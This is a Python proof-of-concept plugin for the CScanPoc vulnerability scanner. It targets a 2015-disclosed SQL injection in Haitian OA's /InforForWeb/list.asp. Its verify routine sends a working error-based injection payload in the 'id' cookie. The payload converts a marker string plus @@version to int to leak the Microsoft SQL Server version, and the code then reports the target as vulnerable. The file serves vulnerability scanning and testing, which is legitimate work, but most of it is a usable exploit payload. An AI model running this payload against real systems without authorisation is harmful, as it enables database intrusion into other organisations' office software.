# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'HaitianOA_0005'  # 平台漏洞编号，留空
    name = '海天OA SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-18'  # 漏洞公布时间
    desc = '''
        海天网络协同办公系统(海天OA)，是一套高质量、高效率、智能化的基于B/S结构的办公系统。产品特色：图形化流程设计、电子印章及手写签名痕迹保留等功能、灵活的工作流处理模式支持、完善的角色权限管理 、严密的安全性管理 、完备的二次开发特性。
        海天OA /InforForWeb/list.asp 处SQL注入,绕过过滤无条件sql注入.
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=087575'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '海天OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c6e4d927-05bc-42d2-a708-7daf5cffbd80'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # GET型
            url = arg + '/InforForWeb/list.asp'
            cookie = 'id=1+and+1%3Dconvert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)'
            code, head, res, err, _ = hh.http(url, cookie=cookie)
            if ((code == 200) or (code == 500) or (code == 302)) and ('WtFaBcMicrosoft SQL Server' in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
